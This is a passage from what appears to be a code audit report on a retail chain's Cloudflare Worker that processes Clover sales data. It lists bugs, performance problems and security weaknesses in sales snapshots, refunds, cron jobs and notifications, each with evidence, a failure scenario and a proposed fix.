**Evidence.** Every night the sweep calls snapshotDayByClientTime for today, D−1 and D−2 (worker.js:28352-28361). That goes through fetchAggregateAndSnapshot, whose only guards are manual override, orderCount===0 and a negative total (4744-4778). There is no ratio against the existing row, unlike rebuildItemSnapshot's BACKFILL_MIN_D1_RATIO (2912-2928). BACKFILL_MIN_D1_RATIO's own comment records Clover returning 192 of 194 orders on a re-snapshot of a recent date. Probe (probe-sweep.mjs step 3): 10 good orders banked, then Clover returns 3 of them → `status: 'ok', total: 290, bucketOrders: 3`; D1 `{ total: 290, order_count: 3 }`; KV items net 290 (was 990). The health check compares snapshot to D1, and both were rewritten together, so it reports the day as healthy.

**Failure scenario.** On a night when Clover degrades by returning fewer orders (rule 4), yesterday's or the day before's complete totals are silently replaced by the short fetch in daily_sales, the item snapshot and the hourly bank. If it happens on the day's final pass (D−2), nothing re-pulls it, and the loss reaches reports, WRS/T13 and the payment-archive reconciliation.

**Plan.** FUTURE PLAN.
1. In snapshotDayByClientTime, measure the createdTime window independently from the wide fetch. Let `inWindow` be the orders with createdTime in [dayStart, dayEnd), `movedOut` those in the window whose client day ≠ D, and `movedIn` those outside it whose client day = D.
2. Read the existing daily_sales row (order_count, total). If `inWindow.length < existing.order_count * BACKFILL_MIN_D1_RATIO` for D < today, skip both writes and return `{ skippedShortFetch: true, inWindow, existing }`. Legitimate clientCreatedTime moves are still allowed, because the check is on the createdTime window, which should never shrink between nights.
3. Back up `items:` and `item-hours:` before overwriting a prior day (rule 2), and abort if the backup fails.
4. Surface the skip in resnapshot-clienttime's status and in the cron log.

Deploy: worker-only, no migration, no ordering constraint.

Risk: an outage day with many late syncs moves orders without changing the createdTime window, so it still passes.

Verify: probe-sweep.mjs step 3 is skipped; a late-sync fixture (orders moved from today into D−1) still lands.

<a id="worker-core-10"></a>
#### worker-core-10 — Fully refunded same-day orders are dropped by the `order.total <= 0` skip and then their refund is subtracted again

*high · major · bug · confidence medium · `worker.js:3794` · unverified*

**Evidence.** aggregateItemSales worker.js:3794: `if (order.total == null || order.total <= 0) continue;` runs BEFORE the Phase 2G payment-sum logic (3804-3815). aggregateOrders 2628 does the same with `=== 0`. The worker itself says Clover zeroes order.total on a full same-day refund: fetchRefundsTotal 2443/2468 `// Full refund → order.total === 0 AND payment sum ≈ refund.amount` and `if (order.total === 0 && pmtSum > 0)`, the live route 28128, and MEMORY.md ('Clover REDUCES order.total for a same-day refund but leaves payment.amount'). The refund still has orderRef to that order, which is absent from orderLineItemMap, and fetchCrossDayOrdersForRefunds does not fetch it because the id is in todayOrderIds (4609-4616). So it lands in 'Refund / Cross-day refunds'. Running the real aggregateItemSales on a $50 kept sale plus a $50 sale fully refunded the same day (scratchpad worker-core/fullrefund.mjs): refunded order.total=0 → `items netSales=0 Hardlines:50 Refund:-50` (true net is $50).

**Failure scenario.** A cashier rings a $120 sale, the customer returns it the same afternoon, and it is refunded in full. That day's daily_sales total, the item snapshot and the bin/retail split are all $120 low. Every same-day full refund, including 'ring, refund, re-ring' corrections, is deducted twice from reported net sales.

**Plan.** FUTURE PLAN.
1. Confirm first, because it depends on Clover's behaviour. Run ?action=sales-diag (it counts zeroTotalOrderCount, 19172) for a date with a known same-day full refund, and check that the zero-total order carries SUCCESS payments equal to the refund.
2. If confirmed, in both aggregators compute pmtSumCents first and skip only when `order.total == null || (order.total < 0) || (order.total === 0 && pmtSumCents <= 0)`. Keep skipping negative totals, which are the manual-refund orders.
3. Add fixtures for full, partial and cross-day refunds asserting net = kept sales.

Deploy: worker-only; it changes numbers from the next snapshot onward. Do NOT bulk re-pull history to 'fix' past days (rule 1): the sweep corrects D−1 and D−2 naturally, and anything older goes through the health check only.

Verify with test-live-sales-reconcile.mjs and test-channel-invariants.mjs.

<a id="worker-core-12"></a>
#### worker-core-12 — Live route answers HTTP 200 with aggregate:null when Clover fails, so the client shows a confident $0

*medium · minor · bug · confidence high · `worker.js:28170` · unverified*

**Evidence.** fetchItemOrders returns null on a failed page (4566), but the route treats null like 'no orders yet': `if (elements && elements.length > 0) { aggregate = ... }` (28170) and responds 200 `{ elements: elements || [], ..., aggregate }`. Probe (scratchpad worker-core/probe-live-fail.mjs, /orders → 503): `200 {"elements":[],"refundCents":0,"binNet":0,"retailNet":0,"channels":null,"aggregate":null}`. The client (index.html:8141-8145) returns null only when the `aggregate` key is missing; otherwise `const a = data.aggregate || { total: 0, retail: 0, bin: 0, ... }`.

**Failure scenario.** During a Clover outage or a 429 burst, every store card shows $0 today, with 0 orders and $0 average cart, for up to the client's 5-minute cache TTL. It looks like the stores stopped trading, instead of falling back to stored figures as the client was designed to.

**Proposed fix.** Worker-only, backward compatible. The client already turns a non-ok response into null, and so into 'no live data'. Right after the Promise.all at 28114-28120, add:
```js
if (elements === null) {
  return new Response(JSON.stringify({ error: "Clover unavailable", code: "CLOVER_FETCH_FAILED" }),
    { status: 502, headers: { ...corsHeaders, "Content-Type": "application/json" } });
}
```
A legitimately empty morning (elements = []) still returns 200 with aggregate null. Verify: probe-live-fail.mjs → 502, and fetchLiveCloverSales returns null.

<a id="worker-core-13"></a>
#### worker-core-13 — Cross-day refund lookups use bare fetch with unbounded parallelism; dropped lookups misfile refunds and skew the bin/retail split

*medium · minor · performance · confidence high · `worker.js:4589` · unverified*

**Evidence.** worker.js:4589-4598: `Promise.allSettled(orderIds.map(async (id) => { ... const resp = await fetch(url, { headers }); if (!resp.ok) throw ...`, followed by `.filter(r => r.status === "fulfilled")`. There is no cloverFetch or 429 retry and no concurrency cap, and failures are silently dropped. A dropped order leaves its refund in the generic 'Refund / Cross-day refunds' bucket (4362-4372), which the bin/retail override counts as RETAIL (`else retailNet += c.netSales`, 4828). It is also redundant: the same refunds' orders are fetched again in the main nightly pass (28301) and in each of the three sweep days that cover the refund (4816), which is about 4 fetches per cross-day refund per night.

**Failure scenario.** After Christmas, BL1 takes 40 returns a day on earlier purchases. The nightly fires 40 simultaneous order GETs on one token, several get 429 and are dropped, and those refunds, including returned bin items, are booked against retail and 'Refund' instead of their L2. D1 bin is overstated, retail understated, and L2 nets are wrong in the item snapshot and T13. It also costs about 160 of the nightly's ~1000-subrequest budget.

**Proposed fix.** In fetchOrdersByIds, use cloverFetch (429 retry) and cap concurrency:
```js
const out = [];
for (let i = 0; i < orderIds.length; i += 4) {
  const chunk = await Promise.allSettled(orderIds.slice(i, i + 4).map(async id => {
    const resp = await cloverFetch(`https://api.clover.com/v3/merchants/${merchantId}/orders/${id}?expand=lineItems.item,lineItems.discounts,discounts,payments`, { headers });
    if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
    return resp.json();
  }));
  for (const r of chunk) if (r.status === 'fulfilled' && r.value) out.push(r.value);
}
return out;
```
Optionally memoise the results per invocation, as a Map on env, so the main pass and the sweep share them. Verify with a harness stub that answers 429 once per id: all orders are returned.

<a id="worker-core-14"></a>
#### worker-core-14 — cloverFetch retries only 429: one 5xx or network error drops a whole page, and the cron never retries the unbanked day

*medium · minor · bug · confidence high · `worker.js:1371` · unverified*

**Evidence.** worker.js:1371-1380: `const resp = await fetch(url, options); if (resp.status !== 429 || attempt === 3) return resp;`. There is no retry on 5xx, a thrown fetch escapes, Retry-After is uncapped (`retryAfter * 1000`), and the 429 body is never consumed, which holds one of the Worker's 6 connections. Callers that fail on a single 5xx: fetchTransactionOrders → `return null` (1904) → banking `INCOMPLETE_FETCH`; fetchItemOrders → null, so the nightly skips the item snapshot and category split; fetchItemCategoryMap → partial map (worker-core-15); the sale scheduler (worker-core-4). The cron only banks `bankDate = todayStr - 3` (28390), so a day skipped with INCOMPLETE_FETCH writes no payment_archive_days row and is never attempted again. cloverFetchWithRetry (2560-2579) already retries 5xx with capped backoff.

**Failure scenario.** Clover returns one 502 on the orders page when BL8's day is being banked. The day is skipped, the next night banks a different date, and about 87 days later that day's transactions exist nowhere, unless someone read the 'NEEDS ATTENTION' console line and ran bank-transactions by hand.

**Proposed fix.** Make cloverFetch retry transient failures on idempotent requests:
```js
async function cloverFetch(url, options = {}) {
  const idempotent = !options.method || options.method === 'GET';
  let delay = 1000;
  for (let attempt = 0; attempt <= 3; attempt++) {
    let resp;
    try { resp = await fetch(url, options); }
    catch (e) { if (!idempotent || attempt === 3) throw e; await new Promise(r => setTimeout(r, delay)); delay *= 2; continue; }
    const retry = resp.status === 429 || (idempotent && resp.status >= 500);
    if (!retry || attempt === 3) return resp;
    try { await resp.body?.cancel(); } catch {}
    const ra = parseInt(resp.headers.get('Retry-After') || '0', 10);
    await new Promise(r => setTimeout(r, ra ? Math.min(ra * 1000, 15000) : delay));
    delay *= 2;
  }
}
```
Separately (cron, outside this range): bank any day in [today−10, today−3] that has no payment_archive_days row, not just today−3.

<a id="worker-core-15"></a>
#### worker-core-15 — fetchItemCategoryMap silently returns an empty or partial map on a Clover failure, and callers write heuristic categories as truth

*medium · minor · bug · confidence medium · `worker.js:1682` · unverified*

**Evidence.** worker.js:1682 `if (!resp.ok) { complete = false; break; }` then 1697-1703: the map is not cached but IS returned. Callers cannot see `complete`. snapshotDayByClientTime (4812-4830), the nightly (28300), ?action=snapshot and the live route then run aggregateItemSales with the thin map, so every item falls to name/IM/heuristic tiers and 'Bin Products' is decided only by the name regex. They then write binRetailOverride {bin, retail, total} to D1 and the category rows to `items:` KV. `_debug.itemCatMapSize` records the size, but nothing acts on it.

**Failure scenario.** The 24 h `item-cats:bl1` cache has expired and Clover answers the first items page with a 503 during the nightly. BL1's item snapshot books hundreds of Clover-categorised items to '[Heuristic] …' and 'Custom Sales'. D1 bin and retail are re-split by name, so 'Ikea Bag'-style bin items without 'bin' in the name move to retail. The Item Sales tab and WRS L2/L3 are wrong for that day until a manual repair.

**Proposed fix.** Expose completeness without changing the return shape. At the end of fetchItemCategoryMap:
```js
Object.defineProperty(map, '__complete', { value: complete, enumerable: false });
return map;
```
(Cached maps are complete by construction; mark them too.) In snapshotDayByClientTime, after 4812: `if (itemCatMap.__complete === false) throw new Error('item category map incomplete');`. That lands in the existing catch, which leaves binRetailOverride and itemData null, so neither the category split nor the item snapshot is written from a thin map. Apply the same line in the nightly and admin snapshot paths. Verify with a harness stub that returns 503 on /items: the item snapshot is not written.

<a id="worker-core-16"></a>
#### worker-core-16 — Nightly cron repeats work in its most budget-constrained invocation (week rolled up to 4x, refunds, credits, overrides and costs fetched again per sweep call)

*medium · minor · performance · confidence high · `worker.js:4837` · unverified*

**Evidence.** (a) snapshotDayByClientTime 4837: `fetchAggregateAndSnapshot(store, env, dayStart, dateStr, dayEnd, binRetailOverride, bucket)` passes no preRefundElements or preManualRefunds, so fetchRefundsTotal re-fetches /v3/refunds and /v3/credits it already has (4814-4815). That is 2 × 18 = 36 extra Clover calls per night, and the result is overwritten by binRetailOverride.total anyway (4731). (b) 4813 `Promise.all([fetchItemOverrides(env), fetchItemCosts(env)])` runs per call: 3 KV reads × 18 = 54, and the cron already holds both (28273-28276). (c) `sweepWeeks` holds DATES, not weeks (28359 `sweepWeeks.add(d)`), and todayStr is rolled up again at 28407. Each rollupWeekSummariesIfReady → writeWeekSummariesForWeek costs 7 stores × (resolveWeekDates D1 + daily_sales D1 + 7 KV get + 1 KV put) = 70 subrequests, and `knownDates` is not passed (3406). So the current week is written up to 4 times, about 280 subrequests where 70-140 are needed. (d) The three sweep windows [D,D+3) overlap, so today's orders are pulled 3× by the sweep plus once by the main pass, whose write the sweep then overwrites.

**Failure scenario.** The 03:55 UTC invocation also does item snapshots, banking, and the sheet import (hundreds of D1 and KV operations). On a heavy-refund night (see worker-core-13) it approaches the ~1000 subrequest ceiling that the codebase itself budgets against. The later best-effort steps (banking, week rollup, sheet import) are the ones that fail, each caught and only logged.

**Proposed fix.** All local edits:
1. Give snapshotDayByClientTime optional `pre = {}` params `{ overrides, itemCosts }`. Hoist `let refundElements = null, manualRefundElements = null` above the try and call `fetchAggregateAndSnapshot(store, env, dayStart, dateStr, dayEnd, binRetailOverride, bucket, refundElements, manualRefundElements)`.
2. In the cron, pass `{ overrides, itemCosts }` into the sweep.
3. Dedupe weeks: collect `SELECT DISTINCT week, date(date,'weekday 6') sat FROM daily_sales WHERE date IN (?,?,?,?)` once, then call writeWeekSummariesForWeek once per week with `knownDates` resolved once.

Optional larger step: one wide fetch per store [today−2, today+1) bucketed into three days replaces the three overlapping fetches and the main pass.

Verify: count env.DB, KV and fetch calls in a harness run of `scheduled()` before and after, and check the outputs (D1 rows, KV keys) are byte-identical.

<a id="worker-core-17"></a>
#### worker-core-17 — Live ?store= response ships the raw Clover order array the client no longer reads, and reads item costs it never uses

*medium · minor · performance · confidence medium · `worker.js:28186` · unverified*

**Evidence.** worker.js:28185-28191: `JSON.stringify({ elements: elements || [], refundCents, binNet, retailNet, channels, aggregate })`. `elements` is every order today with `expand=payments,lineItems.item,lineItems.discounts,discounts` (4554). The only client (index.html:8134-8156, fetchLiveCloverSales) reads only `aggregate` and `channels`; its comment says the browser re-aggregation of data.elements was removed. grep finds no other `?store=` caller. The route also fetches `fetchItemCosts(env)` (28119): 2 KV reads plus a parse of the item-master map, per store per request, although cost never affects netSales or channels in aggregateItemSales (unitCost only feeds cat.cost and coverage, 4167-4203).

**Failure scenario.** Late in the day, each of the 6 live calls per dashboard load returns hundreds of expanded orders. By estimate that is up to about 1 MB of JSON per busy store, which the worker must stringify and a phone on 4G must download and JSON.parse before any card renders. Each load also costs 12 unnecessary KV reads.

**Proposed fix.** Worker-only.
1. Drop `elements` from the body (28186); keep `aggregate`, `channels`, `refundCents`, `binNet`, `retailNet`.
2. Replace `fetchItemCosts(env)` in the Promise.all with `Promise.resolve(EMPTY_ITEM_COSTS)`.

Risk: only a very old installed PWA shell that still re-aggregated `data.elements`. Confirm that the current `CACHE_NAME` shell has shipped, or keep `elements: []` for one release.

Optionally throttle snapshot-on-fetch: skip saveSnapshot when the stored `sales:` KV value is younger than 5 minutes.

Verify: test-live-sales-reconcile.mjs still passes; compare response byte size before and after.

<a id="worker-core-11"></a>
#### worker-core-11 — Live route leaves out manual refunds (credits), so the live cards and intraday D1 are high by that amount and the total drops overnight

*medium · major · bug · confidence high · `worker.js:28157` · unverified*

**Evidence.** worker.js:28114-28120 fetches orders, refunds, the category map, overrides and costs, but not fetchManualRefunds. It then calls `aggregateItemSales(elements, itemCatMap, targetStore, et.dateStr, overrides, itemCosts, refundElements)` (28157-28159) with no manualRefundElements, and `aggregate.total = binNet + retailNet` (28175-28177) is saved to D1 (28202). The nightly and sweep pass manualRefundElements, which creates the 'Manual Refund' L2 (4380-4392). Probe (probe-live.mjs, a $50 credit stubbed): `credits endpoint called on live path: false`, aggregate.total 100 where the nightly definition gives 50.

**Failure scenario.** A manager issues a $300 manual refund at BL4 at noon. All afternoon the live card, and the D1 row it writes on every poll, show net sales $300 higher than the figure the nightly produces at 23:55. A manager comparing the evening number with the next morning's email sees sales 'drop'. Anyone who loads the dashboard between 23:55 and midnight writes the higher figure back over the nightly's, until the next night's sweep.

**Plan.** FUTURE PLAN (small, but it changes what a live write persists).
1. Add `fetchManualRefunds(targetStore, env, startOfToday)` to the Promise.all at 28114.
2. Pass it as the 9th argument: `aggregateItemSales(elements, itemCatMap, targetStore, et.dateStr, overrides, itemCosts, refundElements, [], manualRefundElements)`.
3. Also add `Σ(amount − taxAmount)` over the credits to `refundCents` for the fallback path.

This costs one extra Clover call per live request. Deploy: worker-only; the response shape is unchanged.

Verify: probe-live.mjs total 50, and test-live-sales-reconcile.mjs with a non-empty /credits stub.

<a id="worker-core-18"></a>
#### worker-core-18 — saveSnapshot runs a failing ALTER TABLE on every call, then swallows D1 write failures, so callers report success

*low · minor · code-quality · confidence high · `worker.js:4640` · unverified*

**Evidence.** worker.js:4640: `try { await env.DB.prepare('ALTER TABLE daily_sales ADD COLUMN avg_asp REAL').run(); } catch {}`. The column was added by migration-013, so this DDL fails on every call, including every live dashboard request via 28202, 6 per page load. worker.js:4663-4665: `catch (e) { console.error(`D1 write failed ...`); }`, so fetchAggregateAndSnapshot returns data as written and ?action=snapshot reports `{ ok: true, total }` (18830-18834) even when D1 rejected the write.

**Failure scenario.** Every dashboard load costs 6 wasted D1 round-trips. During a D1 incident, an admin runs the snapshot or repair endpoints, sees ok:true with the new totals, and moves on, but daily_sales still holds the old or missing values (rule 5: confirm the write landed).

**Proposed fix.** Delete line 4640. Make the D1 failure visible: in the catch set `data.d1WriteFailed = e.message;` (saveSnapshot receives `data` by reference). In ?action=snapshot's result mapping add `...(data.d1WriteFailed ? { error: `D1 write failed: ${data.d1WriteFailed}` } : {})`. The change is additive and worker-only.

<a id="worker-core-19"></a>
#### worker-core-19 — fetchAggregateAndSnapshot fails open: if the guard SELECT throws, it writes without the manual-override and zero-order guards

*low · minor · bug · confidence high · `worker.js:4775` · unverified*

**Evidence.** worker.js:4744-4778: the manual-override, zero-order and negative guards all depend on `const existing = await env.DB.prepare("SELECT total, is_manual_override ...").first();`. The catch is `catch (e) { console.warn(`pre-save guard query failed ...`); }`, and execution then falls through to `await saveSnapshot(env, store, dateStr, data);` (4780).

**Failure scenario.** A transient D1 read error on the guard query during the nightly or sweep means a zero-order or negative result, or a write over a manual-override row, goes through unguarded if the following upsert succeeds. That is the exact case the guards exist for.

**Proposed fix.** Treat a failed guard read as a failed write (rule 2). Replace the catch body with:
```js
console.warn(`pre-save guard query failed for ${store}/${dateStr}: ${e.message} — write skipped`);
data.skippedGuardUnavailable = true;
return data;
```
This only adds safety. The sweep's next nightly pass retries D−1 and D−2.

<a id="worker-core-20"></a>
#### worker-core-20 — getStartOfDayET and getETToday are off by one hour on DST-change days; banking uses fixed 24 h days

*low · minor · bug · confidence high · `worker.js:169` · unverified*

**Evidence.** worker.js:169: `const noon = new Date(dateStr + 'T16:00:00Z');`, the offset taken after the 2 AM switch; getETToday (157-165) uses the current offset. Executed against the real function (scratchpad worker-core/dst.mjs): `2026-03-08 → 04:00Z (true 05:00Z) offBy -1`, `2026-11-01 → 05:00Z (true 04:00Z) offBy 1`, `2027-03-14 offBy -1`. bankTransactionsDay also uses `const end = start + 86400000;` (2225), not the next day's start.

**Failure scenario.** On the spring-forward date, 23:00-24:00 of the day before is counted in the new day. On fall-back day, 00:00-01:00 ET is missed by today's window and by transaction banking. Impact is small (stores are closed) but it is a silent boundary error in every snapshot, sweep and bank on those two days a year.

**Proposed fix.** Take the offset at an instant before 2 AM local on that date. worker.js:169: `const probe = new Date(dateStr + 'T05:00:00Z');` (05:00Z is 00:00 EST or 01:00 EDT, before the switch either way). In getETToday: `return { dateStr, startOfDay: getStartOfDayET(dateStr) };`. In bankTransactionsDay: `const end = getStartOfDayET(nextDay(dateStr));`. Verify with dst.mjs: offBy 0 for all four dates.

<a id="worker-core-21"></a>
#### worker-core-21 — CORS sends no Access-Control-Max-Age, so almost every JSON POST, PATCH or DELETE pays an extra preflight round-trip

*low · minor · performance · confidence high · `worker.js:4896` · unverified*

**Evidence.** worker.js:4896-4900: headers are `Access-Control-Allow-Methods`, `Access-Control-Allow-Headers: Content-Type, X-Snapshot-Secret`, `Vary: Origin`, with no `Access-Control-Max-Age`. The app on www.retjghub.com calls api.retjghub.com cross-origin with `Content-Type: application/json` on writes, which are non-simple requests. Without Max-Age browsers cache a preflight for only about 5 s (Chromium default), and every OPTIONS is a billed Worker invocation (15789-15791).

**Failure scenario.** Each save on the installed PWA (manual override, sale schedule, labor hours, bin dump and so on) makes two sequential round-trips instead of one, which is noticeable on store Wi-Fi or cellular.

**Proposed fix.** Add `"Access-Control-Max-Age": "7200"` to the headers object in resolveCors (Chromium caps at 7200, Safari at 600). It is safe because Allow-Origin is still only echoed for allowlisted origins. Verify: scripts/test-cors-origins.mjs still passes.

<a id="worker-core-22"></a>
#### worker-core-22 — Reporting API marks key-authenticated sales data `Cache-Control: public` and accepts the key in the query string

*low · minor · security · confidence medium · `worker.js:15833` · unverified*

**Evidence.** worker.js:15815: `const provided = request.headers.get("X-API-Key") || url.searchParams.get("key") || "";`. Responses at 15833 and 15853 use `"Cache-Control": "public, max-age=300"`, and 15841 uses `public, max-age=60`, for morning-briefing, store-history and afternoon-briefing, which carry per-store revenue.

**Failure scenario.** The external caller uses `?key=`. Any shared cache or logging proxy between it and the API (corporate proxy, CDN, request logs) may store both the chain's sales figures and the secret key, keyed by the full URL, because the response explicitly allows shared caching.

**Proposed fix.** Change all three to `"Cache-Control": "private, max-age=300"` (and `private, max-age=60`); the client-side caching behaviour is unchanged. Separately (a contract change, so coordinate with the Chief of Staff tool): deprecate `?key=` in favour of the X-API-Key header only.

</details>

<a id="worker-cron-notify"></a>
### Worker crons, briefings, push, sale scheduler

The notification crons have been hardened carefully. Recipient scoping and the financial gate are re-checked inside cron, superviseCronJob catches both throws and quiet {error}/failed-email results, Resend sends retry and carry stable idempotency keys, and scheduled posts use an atomic claim, a reconcile step and a reaper. Every push loop deletes subscriptions on 404/410, the RFC 8291 encryption is correct, and the Sunday digest uses Cloudflare's 1=Sunday correctly (MEMORY.md confirms this). The biggest risk is the every-minute sale scheduler, which writes live Clover prices. It has no claim step, and running two overlapping ticks in node gave a double discount ($10 → $6.40) with the $8.00 sale price stored as the price to restore. Revert failures are final and nobody is alerted; the only action the UI then offers deletes the record of the original price. Some emails and pushes show wrong numbers, confirmed in node against in-memory SQLite. The weekly digest leaves out auction revenue but compares against a budget that includes it. The daily email drops closed Holland's budget from its by-store total ($27,500 budget, 94% vs budget), while the Daily Breakdown in the same email shows $32,749. The hourly push reads a D1 row that only a dashboard visit refreshes. It also skips the business gate, and an admin holding only an E-Commerce grant was confirmed to receive chain-wide Bargain Lane pushes. Failure alerting has gaps: the nightly snapshot job is not supervised, a swallowed D1 write reports "ok", and every alert goes by push only, so an alert with no live subscription reaches nobody.

| ID | Sev | Size | Category | Finding | Where | Verified |
|---|---|---|---|---|---|---|
| [worker-cron-notify-1](#worker-cron-notify-1) | high | minor | bug | Sale scheduler has no claim: two overlapping ticks double-discount the item and save the sale price as the original | `worker.js:1579` | ✅ confirmed |
| [worker-cron-notify-2](#worker-cron-notify-2) | high | minor | bug | A failed sale revert is final and silent: the item stays discounted, nothing retries, nobody is alerted, and the UI's only button deletes the original price | `worker.js:1637` | ✅ confirmed |
| [worker-cron-notify-3](#worker-cron-notify-3) | high | minor | bug | Weekly digest 'Net Sales' leaves out auction revenue but is compared against a budget that includes it | `worker.js:7143` | ✅ confirmed |
| [worker-cron-notify-4](#worker-cron-notify-4) | high | minor | bug | Hourly 'Sales Update' push reads today's D1 row, which only a dashboard visit refreshes; it shows stale or $0 figures under the current time | `worker.js:8094` | ✅ confirmed |
| [worker-cron-notify-6](#worker-cron-notify-6) | high | minor | bug | Daily summary email drops closed Holland's budget from its by-store total and disagrees with its own Daily Breakdown; stores that did not report are silently left out | `worker.js:5486` | ✅ confirmed |
| [worker-cron-notify-5](#worker-cron-notify-5) | medium | minor | security | Interval push skips the business gate: an admin holding only an E-Commerce grant is pushed chain-wide Bargain Lane sales every hour | `worker.js:8139` | ✅ confirmed |
| [worker-cron-notify-7](#worker-cron-notify-7) | medium | minor | bug | Nightly snapshot cron is not supervised: a top-level throw, a runtime kill, or a swallowed D1 write never raises an alert | `worker.js:28273` | ✅ confirmed |
| [worker-cron-notify-8](#worker-cron-notify-8) | medium | minor | bug | Scheduled Facebook posts can be published twice: every failure at the /feed step is retried, and the retry cannot see a post Facebook actually created | `worker.js:15426` | ✅ confirmed |
| [worker-cron-notify-9](#worker-cron-notify-9) | medium | minor | bug | Failure alerts go by push only and cannot report their own failure; push-only jobs never count as failed | `worker.js:7357` | ✅ confirmed |
| [worker-cron-notify-10](#worker-cron-notify-10) | low | minor | code-quality | dispatchScheduleFailureAlert is a fourth hand-copied superuser push loop | `worker.js:15332` | ✅ confirmed |
| [worker-cron-notify-11](#worker-cron-notify-11) | low | minor | ui-ux | Interval push headline says 'All Stores' to managers who only see their own stores | `worker.js:8173` | ✅ confirmed |
| [worker-cron-notify-12](#worker-cron-notify-12) | low | minor | performance | sendWebPush rebuilds and re-signs the VAPID JWT for every subscription and has no timeout; fan-outs are serial N+1 queries | `worker.js:9641` | ✅ confirmed |
| [worker-cron-notify-13](#worker-cron-notify-13) | low | minor | security | Push endpoints are not validated: the worker POSTs to any stored URL on every cron, and permanently broken subscriptions are never removed | `worker.js:9654` | ✅ confirmed |
| [worker-cron-notify-14](#worker-cron-notify-14) | low | minor | performance | saveSnapshot runs a failing ALTER TABLE on every call: 24 times a night and on every dashboard load | `worker.js:4640` | ✅ confirmed |
| [worker-cron-notify-15](#worker-cron-notify-15) | low | major | performance | Nightly job does all its work in one serial invocation: today is fetched twice, closed Holland is fully processed, and the subrequest budget comment is out of date | `worker.js:28278` | ✅ confirmed |

<details><summary>Details: evidence, failure scenario, proposed fix</summary>

<a id="worker-cron-notify-1"></a>
#### worker-cron-notify-1 — Sale scheduler has no claim: two overlapping ticks double-discount the item and save the sale price as the original

*high · minor · bug · confidence medium · `worker.js:1579` · ✅ confirmed*

**Evidence.** worker.js:1579-1600 selects `SELECT * FROM sale_schedules WHERE status='pending' AND starts_at <= ? ... LIMIT ?`, then for each row does `getCloverItem` → `computeSalePrice(currentCents, ...)` → `setCloverItemFields(... { price: saleCents, name: saleName })` → `UPDATE sale_schedules SET original_price=?, sale_price=?, original_name=?, status='active' ... WHERE id=?`. Nothing claims the row between the SELECT and the Clover write, and the final UPDATE has no `AND status='pending'`. Compare processScheduledPosts (worker.js:15407 `... WHERE id=? AND status='scheduled'` + `meta.changes !== 1`) and withRetailLock (worker.js:12284), which both guard exactly this. SALE_SUFFIX_RE (worker.js:1539) is defined but never used, so nothing detects an item that is already on sale. I ran this in node: I sliced processSaleSchedules and its helpers out of the file and ran two concurrent calls with a fake Clover item ($10.00, 'Widget'), where the second GET lands after the first POST. Result: Clover `{ price: 640, name: 'SALE SALE Widget (was $10.00) (was $8.00)' }`; D1 row `{ original_price: 800, sale_price: 640, original_name: 'SALE Widget (was $10.00)' }`.

**Failure scenario.** Two runs can overlap in two ways. (1) An every-minute tick runs past 60 s. PER_TICK=50 rows go to one merchant token all at once; cloverFetch backs off 1/2/4 s on each 429 and waits out any Retry-After with no cap; and fetch has no timeout. (2) An admin calls POST ?action=run-sale-scheduler-now (worker.js:28056) while a tick is running. Either way the second run re-reads the item at its sale price and discounts it again: a 20% sale on a $10 item becomes $6.40, and the register label reads 'SALE SALE … (was $8.00)'. When the sale ends, the revert restores original_price=800. The item is then permanently $2 below its real price, and the only D1 record of $10 has been overwritten.

**Proposed fix.** Worker-only, adds safety, no schema change (status is free TEXT, migration-002.sql:16). (a) Refuse to double-discount. After `const item = await getCloverItem(...)` in activation add: `if (String(item.name).startsWith(SALE_PREFIX)) throw new Error('Item already carries a SALE name — refusing to discount it twice');`. (b) Claim before touching Clover: `const c = await env.DB.prepare("UPDATE sale_schedules SET activated_at=? WHERE id=? AND status='pending' AND activated_at IS NULL").bind(nowIso,row.id).run(); if (c.meta?.changes !== 1) return;`. Do the same for revert with `reverted_at` / `status='active' AND reverted_at IS NULL`. Add `AND activated_at IS NULL` / `AND reverted_at IS NULL` to the two SELECTs. (c) Make every status write conditional (`... WHERE id=? AND status='pending'` for activation, `AND status='active'` for revert and error). Then a losing revert cannot overwrite 'completed' with a spurious 'Price drifted' error. (d) Add `AND ends_at > ?` to the pending SELECT, so a row whose window passed during an outage is not flipped on and then off a minute later. Verify with the same node harness: two concurrent runs must leave Clover at 800 and 'SALE Widget (was $10.00)', with original_price=1000.

**Verifier (confirmed).** Checked worker.js:1579-1609. Nothing claims the row. The pending SELECT is unconditional, and the final UPDATE at 1597-1601 is `WHERE id=?` with no status predicate. SALE_SUFFIX_RE (1539) has no reader; grep finds only its definition. Given two overlapping runs, the double discount follows from computeSalePrice/buildSaleName (1543-1561): 800 becomes 640 and the name becomes 'SALE SALE Widget (was $10.00) (was $8.00)'. How reachable is it? run-sale-scheduler-now (28056) has no caller in index.html, so it is only reached by an admin curl. A tick running past 60 s needs Retry-After waits or a hung fetch; cloverFetch without Retry-After caps at about 7 s per call (1371-1379). So tick overlap is rare. There is also a more realistic route to the same double discount that the finding misses. schedule-sale's overlap check (27939-27946) only looks at status IN ('pending','active'). An item left discounted by an errored revert (finding 2) can therefore be put in a new schedule, and activation then discounts the sale price and saves it as original_price. A D1 failure on the 'active' UPDATE after a successful Clover POST is a third route: the catch may leave the row 'pending' or 'error', and original_price stays NULL. I rate it medium, not high: the damage is real (lost original price), but every route needs an abnormal precondition. *Fix notes:* (a) The SALE_PREFIX guard is right and cheap, and it also blocks the errored-revert re-schedule route. (b) Setting activated_at before the GET, together with the `AND activated_at IS NULL` SELECT filter, creates a new silent state. If the isolate dies between the claim and the final UPDATE, the row stays 'pending' forever and no SELECT picks it up again. cancel-sale-schedule would then mark it 'cancelled' without reverting (it only reverts 'active' rows), although the item may already be discounted in Clover. Better order: GET, compute, then a conditional claim that also records the undo data BEFORE the Clover write: `UPDATE sale_schedules SET original_price=?, sale_price=?, original_name=?, activated_at=? WHERE id=? AND status='pending' AND original_price IS NULL` and require changes===1. Then POST, then `SET status='active' WHERE id=? AND status='pending'`. With the undo record written first, a later D1 failure still leaves the original price. Revert should get the same treatment. (c) Conditional status writes are good. (d) `AND ends_at > ?` on its own leaves passed-window rows 'pending' forever: the list shows them as upcoming and delete refuses them. Mark them explicitly instead, e.g. `UPDATE ... SET status='error', error_msg='Window passed before activation' WHERE status='pending' AND ends_at <= ?`. All of this is worker-only and stays inside processSaleSchedules, roughly 30 lines.

<a id="worker-cron-notify-2"></a>
#### worker-cron-notify-2 — A failed sale revert is final and silent: the item stays discounted, nothing retries, nobody is alerted, and the UI's only button deletes the original price

*high · minor · bug · confidence high · `worker.js:1637` · ✅ confirmed*

